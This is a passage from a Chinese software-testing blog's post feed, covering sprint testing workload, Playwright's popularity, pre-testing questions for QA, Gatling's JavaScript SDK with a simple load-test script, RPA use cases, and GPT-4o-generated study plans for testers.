构建工件会有所帮助，但另一种选择是在你自己的机器上设置构建环境。对于特别大的功能，在代码编写之前给开发人员反馈，并鼓励早期分享代码和想法。每日站会（如果有的话）是表达这种对话愿望的好机会。你也可以考虑主动联系开发人员并私下讨论。\n可能会发生尽管使用了上述所有建议，测试人员在冲刺结束时仍然常常工作过载的情况。根据我的经验，这种情况更有可能发生在试图严格遵循僵化的 Scrum 结构的团队中，迭代周期为一到两周。由于工作在冲刺开始时分配，会有一段时间开发人员专注于他们的工作，而测试人员没有太多事情可做。这种动态在冲刺结束时会发生变化。在这种情况下，我强烈建议在回顾会议上提出这个问题。大多数人会同意这是一个长期不可持续的系统性问题。像往常一样，对于自组织团队来说，由团队自己想出解决方案。只要记住监控情况，保留数据，如果没有明显改善，就再次提出这个话题。\n","date":"2024-07-05T10:31:58+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E6%80%8E%E4%B9%88%E5%8F%AF%E8%83%BD%E5%9C%A8%E6%AF%8F%E6%AC%A1%E8%BF%AD%E4%BB%A3%E4%B8%AD%E6%B5%8B%E8%AF%95%E6%89%80%E6%9C%89%E5%86%85%E5%AE%B9/","title":"我怎么可能在每次迭代中测试所有内容？"},{"content":"\n这是一张 主流的 3 大自动化测试工具每周 npm 下载量的统计对比。\nnpm 是 nodejs 的依赖管理工具，所以这张图可以看出在 javascript 这门语言领域，每种工具使用人数的变化情况。\n看图说话，从趋势图上看，3 大工具在 2024 年的命运大相径庭。\ncypress 增速明显放缓，考虑到 cypress 只有 javascript(typescript)版本，所以可以比较确定的是，cypress 的用户数已经停滞不前了; selenium 的用户数开始退坡，考虑到 selenium 有 java 和 python 的版本，我们只能说，在前端领域用 selenium 的人变少了； playwright 的用户数急剧增加，特别是在 2023 年的下半年，曲线陡然上升，可能新用户和从 selenium 转投过来的用户带来了这次爆发式的增长； 结合上次我做的一个关于如何使用 playwright 狂赚美刀的视频，结论很明显了。\n2024 年最值得学习的自动化测试框架就是 playwright 了。\n为什么是 playwright 首先 playwright 有个好爹，微软出品，如果项目不被砍的话，更新和维护的力度是可以得到保证的； 其次 playwright 的入门比 selenium 其实是要简单不少的，适合初学者； 另外 playwright 的多种特性保证了初学者可以用相对简单的代码写出可以稳定运行的测试用例，做过自动化测试的同学肯定知道，对于用例来说，稳定运行意味着什么； 最后，也就是最为重要的一点就是，大部分的在其他测试层面，比如单元测试或者接口测试，搞不定的用例或者操作，都可以用 ui 自动化工具来实现。也就是重剑无锋，大巧不工。这就意味着，除了测试，ui 自动化工具的应用范围其实非常广，学的好真的可以赚钱。还是我上次视频里提到的 ai 设备之耻——rabbit R1 的例子，既然 ai 现阶段没办法实现自动打车或者定外卖的功能，那就让 playwright 去实现吧； 如何学习 首先建议初学者使用 typescript 的版本，原因很简单，ts 版本配合编辑器会带来完备的代码提示，对初学者来说很可能带来极大的帮助； 建议使用默认的带 testsuit 也就是测试套件的版本进行学习，因为这个版本自带断言，测试的目的就是为了各种断言； 官方文档是最好的学习资料，因为官方文档更新非常及时，毕竟 playwright 还在密集开发中，经常隔一段时间就会带来一些新特性； 开坑 一转眼就下半年了，准备开个 playwright 教程的坑，其实之前一直想做的，但无奈 playwright 更新太快，所以就这么搁置起来了。\n目前 playwright 的 api 相对稳定了不少，是时候可以开个坑了。\n","date":"2024-06-28T09:26:52+08:00","permalink":"zh.ethanhan.cc/p/2024%E5%B9%B4%E6%9C%80%E5%80%BC%E5%BE%97%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/","title":"2024年最值得学习的自动化测试工具"},{"content":"对于测试同学来说，为了详细了解背景，你必须在合适的时间向合适的人提出合适的问题。如果没有背景信息，你可能无法设计出有效的测试场景。\n在没有有效测试场景的情况下，你可能无法为团队提供有价值的反馈，而这是质量保证人员（QA）所期望的。最终，团队将对测试过程失去信心，产品负责人可能会对软件质量提出质疑。因此，提问不仅对深入了解背景至关重要，还对确保交付的软件符合每个利益相关者的期望至关重要。\n我的测试方法总是从向参与决策过程的不同人员提问开始。这使我能够深入了解变更的原因。\n我向技术主管和架构师提问，以了解他们如何规划代码变更以适应新的业务需求。\n我向产品负责人提问，了解计划中的变更将如何解决用户的问题。这让我了解客户面临的问题。\n在这篇文章里，我将分享在开始测试之前你应该问的这些基本问题。\n目录 在测试之前 QA 应问的基本问题 什么变了？ 为什么变了？ 影响在哪里？ 什么变了？ 你必须首先问产品负责人：计划做哪些变更？为了详细了解，可以进一步拆分为更小的问题，比如：\n具体修改了哪些组件？（例如数据库、后端、前端或其他系统服务） 哪些改动影响了系统的状态路径？ 是否引入了任何新的终端用户功能？ 这些变更为终端用户解决了什么问题？ 为什么变了？ 同样重要的是了解变更背后的理由。你应该能够理解客户面临的问题，这些问题促成了这一决策。如果不了解用户的痛点，作为 QA，你无法确保变更是否有效地解决了这些问题。为了进一步拆分这个问题，你可以问以下跟进问题：\n在此次变更之前，利益相关者具体遇到了哪些问题或痛点？ 实施此变更预期带来的好处或改进是什么？ 影响在哪里？ “影响在哪里？”是有效测试计划中最重要的问题之一。你应该尽早识别受影响的区域。通过定位受影响的区域，你可以设计出全面覆盖这些变更的测试场景。\n总之，作为 QA，你应该具备设计有效测试场景所需的所有知识。你可以根据你的系统和情况调整这些问题，但你必须尽早得到这些问题的答案，以确保你的测试高效且有效。\n","date":"2024-06-20T19:59:15+08:00","permalink":"zh.ethanhan.cc/p/%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95%E5%89%8D%E5%BF%85%E9%A1%BB%E9%97%AE%E7%9A%84%E4%B8%89%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/","title":"进行测试前必须问的三个基本问题"},{"content":"很久之前给大家介绍过一款性能测试工具 Gatling。该工具有开源版本和企业版本，一般情况下我们只关注开源版本，毕竟企业版还是非常贵的。之前的开源版本中，测试脚本是用 Scala 写的，这门语言有点高阶，写起来不顺手，不过 2024 年的今天，情况有所改变。\nGatling 团队 5 月 23 日宣布，他们已为 Gatling 负载测试新增了 JavaScript 和 TypeScript SDK。这个新的 JavaScript SDK 是 npm 库中第一个企业级负载测试工具，使更多的开发者能够使用他们熟悉的编程语言进行 Gatling 负载测试。\n自从 Gatling 推出以来，它一直是一个基于 Java 虚拟机（JVM）的开发工具，专注于负载测试。现在，开发者可以使用 Gatling JavaScript SDK 编写负载测试，并将测试编译在 JVM 上运行。这结合了脚本语言的灵活性和多线程等必要的性能特性。\n最重要的是，使用 Gatling 不再局限于 Java 开发者。通过 npm 安装命令设置项目，熟悉的语法使 JavaScript 开发者可以轻松上手，同时拥有 Gatling 引擎的强大功能来运行负载测试。\n为什么 Gatling 团队开发了 JavaScript 和 TypeScript SDK？ JavaScript 生态系统的惊人发展是不可否认的。最初，它只是一个前端脚本语言。随着 NodeJS 和 TypeScript 的出现，它现在成为构建现代 Web 应用程序和 API 的全栈、类型安全的语言。根据某些估计，JavaScript 是 98%财富 500 强企业技术栈的一部分。\nJava 和 JavaScript 的历史 Java 和 JavaScript 的历史从一开始就紧密相连。两种语言都是在硅谷开发并于 1995 年发布的。JavaScript 最初被称为 Mocha，但 Netscape 将其改名为 JavaScript，以利用 Java 日益增长的人气。\n多年来，这两种语言在很大程度上是互补的，Java 作为服务器端的主力，而 JavaScript 则为浏览器中的网站和应用程序提供动力。从一开始，Netscape 的开发者就意识到了在服务器端运行 JavaScript 的潜力。\n1997 年，Netscape 开始开发 Rhino，一个能够在 JVM 上运行的 JavaScript 引擎。尽管 Rhino 有编译和解释版本，但仍然存在性能问题。Oracle 后来开发了 Nashorn 取代 Rhino，但由于 JavaScript 生态系统的发展过快，Nashorn 在 Java 11 中被弃用。\n在弃用 Nashorn 后不久，Oracle 发布了 GraalVM，这是一个可供社区和企业使用的 Java 开发工具包（JDK）。GraalVM 是流行的 OpenJDK 的替代品，包括以下功能：\nGraal 编译器，即时编译器（JIT）。 GraalVM 原生映像，提前编译 Java 应用程序。 Truffle 语言实现框架和 GraalVM SDK，为其他编程语言的实现提供 Java 框架。 GraalVM 多语言 API，在 Java 主机应用程序中嵌入客语言代码。 JavaScript 运行时，符合 ECMAScript 2023 标准的 JavaScript 和 Node.js 运行时。 LLVM 运行时，执行可以翻译成 LLVM 位代码的语言。 GraalVM 的发布促使 Gatling 的开发者开始着手开发 JavaScript SDK。\n技术细节 SDK 的目标是允许 Gatling 用户完全使用 JavaScript 或 TypeScript 编写负载测试模拟。用户还可以包括自己喜欢的 npm 库，同时利用 Gatling 健壮且经过良好测试的代码库。\n为实现这一目标，Gatling 团队在 GraalVM 上运行，这是一个多语言虚拟机，能够在同一环境中运行多种编程语言的代码。JavaScript 支持来自 GraalJS 项目。\n当开发者用 JavaScript 编写模拟时，他们对 SDK 的所有调用都会被转换为对 Gatling Java SDK 的调用。模拟然后可以在与用 Java、Kotlin 或 Scala 编写的模拟相同的 Gatling 引擎上运行。\n使用 JavaScript 或 TypeScript 的唯一前提是安装 NodeJS（带有 npm）。当开发者运行第一个负载测试时，Gatling-js CLI 会下载 GraalVM 和一些 Java 库以启用 Gatling 引擎。\nJavaScript SDK 还支持 Gatling Recorder，这是一个应用程序，可以捕获基于浏览器的用户操作并将其转换为负载测试脚本。如果开发者是负载测试的新手，Recorder 是学习复杂场景脚本的另一个绝佳工具。\n接下来的计划 Gatling JavaScript SDK 的首个版本涵盖了几乎所有 Java SDK 可用的 HTTP 协议功能。作为 Gatling 开放核心承诺的一部分，并遵循 Apache 2.0 许可证，所有 Gatling 用户都可以使用。Gatling 团队正在积极推进三个项目，以扩展 JavaScript 开发者的体验：\n在 Gatling Enterprise 上支持 JavaScript 和 TypeScript。 扩展 SDK 以涵盖更多协议，如 WebSocket 和 gRPC。 Gatling 团队知道一些现有客户非常期待将 Gatling 的使用扩展到他们的 JavaScript 和 TypeScript 开发者，因此 Gatling Enterprise 的支持正在进行中。团队将在接下来的几周内分享更多细节。\n看下测试脚本究竟怎么写的 翻了一下文档，目前 js 的 sdk 只支持发送 http 请求，坦白来说竞争力还是不足的，毕竟 k6 就支持 js，而且特性更加丰富。不过我们也看到，gatling 还是有计划为 js sdk 提供更多的协议支持的。\n根据官方文档，简单的 js 的测试脚本如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { constantUsersPerSec, scenario, simulation } from \u0026#34;@gatling.io/core\u0026#34;; import { http } from \u0026#34;@gatling.io/http\u0026#34;; export default simulation((setUp) =\u0026gt; { const httpProtocol = http .baseUrl(\u0026#34;https://computer-database.gatling.io\u0026#34;) .acceptHeader(\u0026#34;application/json\u0026#34;) .contentTypeHeader(\u0026#34;application/json\u0026#34;); const myScenario = scenario(\u0026#34;My Scenario\u0026#34;).exec( http(\u0026#34;Request 1\u0026#34;).get(\u0026#34;/computers/\u0026#34;) ); setUp(myScenario.injectOpen(constantUsersPerSec(2).during(60))).protocols( httpProtocol ); }); 看起来还不错，实话实说跟其他家支持 js 的性能工具比较的话，同质化还是很严重的。这里就不展开了，顺便一提 Gatling 的本地安装过程有一点点的纯新手劝退，所以要跑起来的话可能会相对麻烦一点点。\n说实话我还是非常期待后面的 typescript 版本的，因为上了 ts 之后，就有完备的代码提示效果了，这对新手来说非常重要。\n总结 新的 js sdk 的引入给 Gatling 这款冷门的性能测试工具增加了一点点的活力，目前来说只是初级阶段，并没有给人带来太多的惊喜。然而只要是只支持纯脚本的测试工具，怎么看来都是专业和相对冷门的选择，很难广泛的流行开来。这样看来，支持哪种类型的脚本语言其实并不重要了吧。\n","date":"2024-05-31T07:53:06+08:00","permalink":"zh.ethanhan.cc/p/%E6%B4%BB%E4%B9%85%E8%A7%81%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7gatling%E6%94%AF%E6%8C%81javascript%E4%BA%86/","title":"活久见!性能测试工具Gatling支持javascript了"},{"content":"最近有机会看到了 RPA 在实际工作中的重度应用，深刻感受到了自动化的强大实力，以后的应用前景时完全可期的。\nRPA (Robotic Process Automation) 简介 Robotic Process Automation (RPA) 是一种技术，使用软件机器人（或称“机器人”）来模拟人类在数字系统中执行的任务。RPA 可以自动执行高度重复性和规则驱动的任务，这些任务通常需要人类操作来完成。RPA 通过与现有系统和应用程序进行交互，无需对底层系统进行改动即可实现自动化。\n本质上讲 RPA 就是自动化脚本，好的 RPA 脚本可以结合页面自动化，桌面自动化（操作桌面级的应用，比如微信电脑版）以及接口自动化，用自动化去替代人类操作。与自动化用例不同的是 RPA 里面的断言不是必须的，自动化用例的目的是验证，也就是实现断言；RPA 的目的是高效率低错误率的完成工作，比如给微信群群发消息之类的。从本质上讲，RPA 就是一种自动化测试，一种理论上可以省略断言的自动化测试。但实际上如果想要 RPA 脚本长时间稳定运行，断言也是必不可少的，当断言条件不满足时，RPA 脚本应该进行无损的容错处理，这样程序才会更加健壮。\n我们可以把 RPA 看成是综合性的自动化测试，也就是设备端的自动化。比如下面这个 RPA 场景：\n第一步调用 api 自动获取一些最新的资讯，用 ai 做改写。这是接口自动化； 在网页端把改写后的资讯发布到某资讯网站。这是网页自动化； 在桌面端把新发布的资讯自动发送到微信群里。这是桌面应用的自动化； 最后调用设备农场的手机，在所有的手机上给这篇资讯点赞。这是手机自动化； 因为测试金字塔的关系，我们会将自动化测试分为 ui，接口以及单元测试，这些测试之间天然隔绝，相对独立，所以想象的空间其实不大，只是代替人工进行验证而已。其实这是没问题的，毕竟每种测试代表的主体不一样，分开使得测试用例变得更加容易编写和维护。\n但 RPA 的主体是机器人，他的目标就是代替人类办公过程中的大量的重复性操作，多种自动化技术和 ai 技术的结合才可以达到这种效果，这么一想其实结论很明显了，RPA 就是自动化测试，是所有种类自动化测试的终极合体形态（有点中二了）。\nRPA 的真实应用案例 我看到的实际例子 我看到的实际应用其实是在电商上，有朋友开了一家跨境电商的公司，我去那边拜访的时候正好遇到他在研究国内某家 RPA 厂商(最近融资了 1 亿美金)的方案。因为电商的重复性劳动是非常多的，所以 RPA 的应用场景相当的广阔。最震撼的例子是退货退款的例子。\n一些商家平时的销量比较大，但众口难调，出的单越多，退货的比例就越高。\n每个退货单其实逻辑上不需要审核，只要退就好了，但是流程上还是要系统在系统上做一些操作的，因为处理有时效性，需要在短时间内快速解决掉，用人工做的话长时间下来工人会感到疲惫，另外操作的效率也相对较低。这时候 RPA 就可以很好的满足长时间高效率低错误率的重复性工作，据说一到两天可以处理几万个订单，这其中节省的人力真的是非常可观的。\n另外还有很多跨境电商公司用 rpa 做批量上下商品等操作，也是非常杀手级的应用。\n其他的 RPA 应用领域如下。\n1. 银行与金融 应用场景: 贷款处理、账户开立、反洗钱监控、客户服务。 案例: 某大型银行采用 RPA 自动化贷款处理过程，包括贷款申请数据的验证和审批，从而将处理时间从几天缩短到几小时。此举不仅提高了效率，还减少了人工处理中的错误。\n2. 保险 应用场景: 保险理赔处理、保单管理、客户查询响应。 案例: 某保险公司使用 RPA 自动化理赔处理，包括从客户提交理赔申请到最终审批的全过程。RPA 机器人可以从电子邮件中提取信息、更新系统记录，并发送确认邮件给客户，大大缩短了理赔处理时间。\n3. 零售与电子商务 应用场景: 订单处理、库存管理、价格监控。 案例: 某大型电子商务平台利用 RPA 自动化订单处理和库存管理。机器人可以自动更新库存信息、处理订单和生成发票，从而减少了人工干预，提高了订单处理的准确性和速度。\n4. 人力资源 应用场景: 员工入职和离职管理、薪资处理、考勤管理。 案例: 某跨国公司采用 RPA 自动化员工入职流程，包括背景调查、合同生成和系统权限分配等步骤。这样，入职过程变得更加高效和无缝衔接。\n5. 医疗 应用场景: 病人记录管理、预约安排、保险理赔。 案例: 某医院使用 RPA 管理病人记录和保险理赔。机器人可以从不同系统中提取病人信息，更新电子健康记录，并与保险公司系统交互提交理赔申请，减少了手工操作的工作量和出错率。\nRPA 的主要优点 提高效率: 机器人可以 24/7 不间断工作，大大提高了任务的处理速度。 减少错误: 机器人严格按照预定规则执行任务，减少了人工处理中的错误。 节省成本: RPA 机器人可以替代大量重复性的人工操作，降低了人工成本。 增强合规性: 机器人操作可追踪和记录，确保了任务执行的合规性和可审计性。 灵活性和可扩展性: RPA 解决方案可以根据业务需求快速扩展和调整。 总结 RPA 通过自动化重复性和规则驱动的任务，帮助企业提高效率、减少错误和降低成本。在银行、保险、零售、人力资源和医疗等各个行业中，RPA 都展现出了强大的应用潜力和实际效果。随着技术的不断发展，RPA 将在更多领域得到更广泛的应用。\n那么问题就来了，RPA 脚本也是需要人来写的，那么什么样的人最适合去编写喝维护 RPA 脚本呢？\n","date":"2024-05-24T09:15:57+08:00","permalink":"zh.ethanhan.cc/p/%E5%BD%93%E4%BB%8A%E7%88%86%E7%81%AB%E7%9A%84rpa%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/","title":"当今爆火的RPA其实就是自动化测试"},{"content":"chatgpt4o 已经发布几天了，近期关于这个模型的各种测试评测层出不穷，不过可以看到该模型在学习教育领域潜力巨大，可以教初中生学数学，教老外学英语，教学方式新颖独特，比普通老师教的都好。\n今天正好被灰度到了 gpt4o，发现其知识库是 2023 年的，比之前的 3.5 要新不少，正好可以问一下跟测试同学自我提升相关的问题。\n第一个问题: 请帮我制定一个 2024 年软件测试人员的技术提升计划 制定一个 2024 年软件测试人员的技术提升计划需要考虑当前的技术趋势、行业需求以及个人的职业目标。以下是一个详细的技术提升计划：\n第一季度：基础夯实与工具掌握 巩固基础知识\n复习软件测试基础理论：测试生命周期、测试类型（如单元测试、集成测试、系统测试、验收测试等）。 学习和掌握测试用例设计方法：等价类划分、边界值分析、因果图、状态转换测试等。 工具使用\n熟练掌握常用的测试管理工具：JIRA、TestRail、Zephyr 等。 学习和使用版本控制工具：Git。 学习自动化测试工具：Selenium、Appium（针对 Web 和移动应用）。 编程技能\n学习一门编程语言，如 Python 或 Java，掌握基础语法和编程逻辑。 编写简单的测试脚本，进行单元测试和简单的自动化测试。 第二季度：深入自动化测试与持续集成 自动化测试进阶\n学习和掌握高级的 Selenium 用法：页面对象模型（POM）、数据驱动测试（DDT）。 掌握移动应用测试工具 Appium 的进阶技巧。 学习 API 测试工具：Postman、RestAssured，并掌握 API 测试的基本方法。 持续集成/持续交付（CI/CD）\n学习 CI/CD 基础知识和概念。 掌握 CI/CD 工具：Jenkins、GitLab CI、CircleCI 等。 实践在项目中配置自动化测试与 CI/CD 管道。 测试框架\n学习和使用测试框架：JUnit、TestNG（针对 Java），PyTest（针对 Python）。 设计和实现端到端测试框架。 第三季度：性能测试与安全测试 性能测试\n学习性能测试的基础理论和方法。 掌握性能测试工具：JMeter、LoadRunner。 进行性能测试脚本编写和性能分析。 安全测试\n学习和掌握基本的安全测试知识：OWASP Top 10、常见的安全漏洞（如 SQL 注入、XSS 等）。 使用安全测试工具：Burp Suite、OWASP ZAP。 进行安全测试实践，识别和修复常见的安全问题。 第四季度：云测试与新技术探索 云测试\n学习云计算的基础知识和主要服务提供商：AWS、Azure、Google Cloud。 掌握云环境下的测试：使用云服务进行测试环境搭建和管理。 学习云原生应用的测试方法和工具：Kubernetes、Docker。 新技术探索\n关注 AI 在测试领域的应用，学习和使用一些 AI 测试工具：Test.ai、Applitools。 学习和探索智能化测试技术，如自动化测试生成、缺陷预测等。 持续学习与社区参与 持续学习\n订阅和阅读相关技术博客、白皮书和行业报告。 参加线上和线下的技术会议、研讨会和讲座，如 Selenium Conference、Agile Testing Days 等。 社区参与\n积极参与测试社区，如 Stack Overflow、GitHub、Reddit 的测试板块。 参与开源项目，贡献代码或测试用例，提高实践能力。 与同行进行交流和分享，通过讨论和合作提高自身技能。 总结 通过以上系统化的技术提升计划，软件测试人员可以在 2024 年全面提升自己的技能，适应行业的发展需求，推动个人职业发展。同时，需要根据个人实际情况和职业规划灵活调整计划，确保持续的学习和进步。\n基本上没毛病，有些测试工具我也没见过，不得不说除了没有提及一些近期非常火爆的测试工具之外，其他的地方已经接近甚至超过普通人的水平了。\n第二个问题: 请为软件测试人员制定 2024 年学习 selenium 的计划大纲 制定一个 2024 年学习 Selenium 的计划大纲可以帮助软件测试人员系统地掌握这项关键的自动化测试工具。以下是一个详细的学习计划大纲，分为四个季度，每季度专注于不同的学习目标和实践内容。\n第一季度：基础知识与环境搭建 Selenium 基础\n了解 Selenium 的历史和应用场景。 熟悉 Selenium 的主要组件：Selenium WebDriver、Selenium Grid、Selenium IDE。 环境搭建\n安装 Java/Python（根据选择的编程语言）。 配置 Selenium WebDriver 的开发环境。 设置浏览器驱动（如 ChromeDriver、GeckoDriver）。 基础操作\n学习定位元素的方法：ID、Name、ClassName、TagName、CSS Selector、XPath。 掌握基本的浏览器操作：打开网页、点击、输入文本、获取文本等。 编写简单的测试脚本\n编写第一个 Selenium 测试脚本，实现简单的登录测试。 学习使用 Assertions 进行验证。 第二季度：进阶操作与测试设计 进阶操作\n学习处理动态内容：显式等待（Explicit Waits）、隐式等待（Implicit Waits）。 掌握处理弹窗和对话框：Alert、Prompt、Confirm。 学习处理多窗口和框架：切换窗口、处理 iframe。 页面对象模型（POM）\n了解页面对象模型的概念和优点。 设计和实现 POM 结构。 编写和重构测试脚本以使用 POM。 数据驱动测试（DDT）\n了解数据驱动测试的概念。 使用外部数据源（如 Excel、CSV、数据库）进行数据驱动测试。 实现数据驱动测试的实例。 第三季度：自动化测试框架与持续集成 测试框架\n了解测试框架的概念和必要性。 学习和使用 JUnit/TestNG（Java）或 PyTest（Python）。 设计和实现一个简单的测试框架。 持续集成（CI）\n了解持续集成的基本概念。 学习 Jenkins 的基本操作和配置。 将 Selenium 测试集成到 Jenkins 中，实现自动化测试的持续集成。 测试报告与日志\n学习生成和分析测试报告：使用 TestNG/JUnit 的报告功能。 实现日志记录功能，了解常用的日志框架（如 Log4j、SLF4J）。 第四季度：高级话题与实际项目应用 Selenium Grid\n了解 Selenium Grid 的概念和应用场景。 配置和使用 Selenium Grid 进行分布式测试。 实现跨浏览器和跨平台的自动化测试。 移动应用测试\n学习 Appium 的基础知识，了解其与 Selenium 的关系。 配置 Appium 环境并进行简单的移动应用测试。 新技术探索\n探索和学习 AI 在测试中的应用：使用工具如 Test.ai、Applitools。 学习并实践基于云的自动化测试解决方案：使用服务如 BrowserStack、Sauce Labs。 实际项目应用\n在实际项目中应用所学的 Selenium 技能。 参与团队的自动化测试任务，编写和维护自动化测试脚本。 总结和分享学习成果，编写技术博客或参与技术社区的讨论。 总结与反思 总结学习成果\n回顾全年学习内容，整理笔记和代码。 总结在实际项目中的应用经验和遇到的问题。 持续改进\n参加技术交流会或研讨会，与同行分享经验。 关注 Selenium 社区的最新动态和更新，持续学习和改进。 通过这个详细的学习计划，软件测试人员可以在 2024 年系统地学习和掌握 Selenium，提高自动化测试能力，提升职业竞争力。\n稍微粗旷了一点点，没有那么细致，但平心而论，比我自己规划的要详细不少，而且还有跟 ai 相关的与时俱进的内容，非常的强大。\n第三个问题: 请为软件测试人员制定 2024 年学习 playwright 的计划大纲 制定一个 2024 年学习 Playwright 的计划大纲，可以帮助软件测试人员系统地掌握这项现代的自动化测试工具。以下是一个详细的学习计划大纲，分为四个季度，每季度专注于不同的学习目标和实践内容。\n第一季度：基础知识与环境搭建 Playwright 基础\n了解 Playwright 的历史和优势。 熟悉 Playwright 的主要功能和特性：跨浏览器支持、自动化操作、并行测试等。 环境搭建\n安装 Node.js 和 npm（Node 包管理器）。 创建新的 Node.js 项目并安装 Playwright。 配置 Playwright 开发环境，包括浏览器驱动程序的设置。 基础操作\n学习定位元素的方法：CSS 选择器、文本选择器、XPath 等。 掌握基本的浏览器操作：打开网页、点击、输入文本、获取文本等。 编写简单的测试脚本\n编写第一个 Playwright 测试脚本，实现简单的登录测试。 学习使用断言库（如 Expect）进行验证。 第二季度：进阶操作与测试设计 进阶操作\n学习处理动态内容：等待元素、处理弹窗和对话框。 掌握处理多窗口和框架：切换窗口、处理 iframe。 学习文件上传和下载的处理方法。 页面对象模型（POM）\n了解页面对象模型的概念和优点。 设计和实现 POM 结构。 编写和重构测试脚本以使用 POM。 数据驱动测试（DDT）\n了解数据驱动测试的概念。 使用外部数据源（如 JSON、CSV）进行数据驱动测试。 实现数据驱动测试的实例。 第三季度：自动化测试框架与持续集成 测试框架\n了解测试框架的概念和必要性。 学习使用 Playwright Test 框架。 设计和实现一个简单的测试框架。 持续集成（CI）\n了解持续集成的基本概念。 学习 CI/CD 工具（如 Jenkins、GitHub Actions）的基本操作和配置。 将 Playwright 测试集成到 CI/CD 管道中，实现自动化测试的持续集成。 测试报告与日志\n学习生成和分析测试报告：使用 Playwright Test 报告功能。 实现日志记录功能，了解常用的日志框架。 第四季度：高级话题与实际项目应用 并行测试与负载均衡\n学习 Playwright 的并行测试功能。 配置和使用 Playwright 的并行测试和负载均衡功能，提高测试效率。 移动端测试\n学习 Playwright 的移动端测试功能。 配置移动端测试环境，编写和运行移动端测试脚本。 新技术探索\n探索和学习 AI 在测试中的应用：使用工具如 Test.ai、Applitools。 学习并实践基于云的自动化测试解决方案：使用服务如 BrowserStack、Sauce Labs。 实际项目应用\n在实际项目中应用所学的 Playwright 技能。 参与团队的自动化测试任务，编写和维护自动化测试脚本。 总结和分享学习成果，编写技术博客或参与技术社区的讨论。 总结与反思 总结学习成果\n回顾全年学习内容，整理笔记和代码。 总结在实际项目中的应用经验和遇到的问题。 持续改进\n参加技术交流会或研讨会，与同行分享经验。 关注 Playwright 社区的最新动态和更新，持续学习和改进。 通过这个详细的学习计划，软件测试人员可以在 2024 年系统地学习和掌握 Playwright，提高自动化测试能力，提升职业竞争力。\n这个就一般般了，基本上是 selenium 计划的翻版，没有体现出 playwright 的一些独特之处，泛泛而谈吧，可以差评。\n第四个问题: 请为软件测试人员制定 2024 年学习接口测试的计划大纲 制定一个 2024 年学习接口测试的计划大纲，可以帮助软件测试人员系统地掌握接口测试的相关技能和工具。以下是一个详细的学习计划大纲，分为四个季度，每季度专注于不同的学习目标和实践内容。\n第一季度：基础知识与工具入门 接口测试基础\n了解接口测试的概念和重要性。 熟悉常见的接口类型：RESTful API、SOAP API。 理解 HTTP 协议基础：请求方法（GET、POST、PUT、DELETE 等）、状态码、请求和响应头、请求和响应体。 工具入门\n学习使用 Postman 进行手动接口测试。 学习基本操作：发送请求、查看响应、添加参数和头信息、验证响应数据。 编写简单的测试用例\n编写基本的 API 测试用例，包括常见的 CRUD 操作（创建、读取、更新、删除）。 学习如何在 Postman 中组织和管理测试用例。 自动化测试基础\n了解接口测试自动化的基本概念。 学习使用 Postman 的 Collection Runner 进行简单的自动化测试。 第二季度：进阶操作与测试框架 进阶操作\n学习如何处理认证和授权：API 密钥、OAuth 2.0、JWT 等。 学习如何处理复杂的请求和响应数据：JSON 和 XML 格式。 数据驱动测试\n了解数据驱动测试的概念和优势。 使用 Postman 的环境变量和全局变量实现数据驱动测试。 使用外部数据源（如 CSV、JSON 文件）进行数据驱动测试。 测试框架\n学习使用 API 测试框架：RestAssured（针对 Java）、Requests 库和 PyTest（针对 Python）。 设计和实现一个简单的 API 测试框架。 持续集成（CI）\n学习将 API 测试集成到 CI/CD 管道中：使用 Jenkins、GitLab CI、GitHub Actions 等工具。 配置自动化测试的定时运行和结果报告。 第三季度：性能测试与安全测试 性能测试\n学习性能测试的基本概念和方法。 使用工具进行 API 性能测试：JMeter、LoadRunner。 编写和运行简单的性能测试脚本，分析性能测试结果。 安全测试\n了解 API 常见的安全问题：SQL 注入、跨站脚本（XSS）、跨站请求伪造（CSRF）等。 使用安全测试工具：OWASP ZAP、Burp Suite。 进行简单的安全测试，识别和修复常见的安全漏洞。 Mock 服务\n学习使用 Mock 服务进行接口测试。 使用工具如 WireMock、MockServer 创建和管理 Mock 服务。 在测试中使用 Mock 服务进行独立的接口测试。 第四季度：高级话题与实际项目应用 高级话题\n学习 API 契约测试：了解契约测试的概念和工具（如 Pact）。 学习 API 监控：使用工具如 Prometheus、Grafana 进行 API 监控和报警。 学习 GraphQL 接口测试的基础知识和工具。 实际项目应用\n在实际项目中应用所学的接口测试技能。 参与团队的接口测试任务，编写和维护自动化测试脚本。 设计和实施全面的接口测试策略，包括功能测试、性能测试和安全测试。 总结与反思\n回顾全年学习内容，整理笔记和代码。 总结在实际项目中的应用经验和遇到的问题。 持续学习与社区参与 持续学习\n订阅和阅读相关技术博客、白皮书和行业报告。 参加线上和线下的技术会议、研讨会和讲座，如 API World、Testing Conferences 等。 社区参与\n积极参与测试社区，如 Stack Overflow、GitHub、Reddit 的 API 测试板块。 参与开源项目，贡献代码或测试用例，提高实践能力。 与同行进行交流和分享，通过讨论和合作提高自身技能。 通过这个详细的学习计划，软件测试人员可以在 2024 年系统地学习和掌握接口测试，提高自动化测试能力，提升职业竞争力。\n很全面而且循序渐进，好评。\n第五个问题: 请为软件测试人员制定 2024 年学习性能测试的计划大纲 制定一个 2024 年学习性能测试的计划大纲，可以帮助软件测试人员系统地掌握性能测试的相关技能和工具。以下是一个详细的学习计划大纲，分为四个季度，每季度专注于不同的学习目标和实践内容。\n第一季度：基础知识与工具入门 性能测试基础\n了解性能测试的基本概念：响应时间、吞吐量、并发用户数、延迟等。 熟悉性能测试的主要类型：负载测试、压力测试、容量测试、稳定性测试。 工具入门\n学习使用 JMeter 进行性能测试。 安装和配置 JMeter。 掌握基本的操作：创建测试计划、添加线程组、配置 HTTP 请求、设置监听器查看结果。 基础测试\n编写简单的性能测试脚本：模拟基本的用户操作（如登录、浏览、提交表单）。 学习分析测试结果：理解图表和报告中的关键指标。 第二季度：进阶操作与脚本优化 进阶操作\n学习使用 JMeter 的高级功能：参数化、关联、定时器、断言等。 学习使用 JMeter 插件：安装和使用常用的插件（如 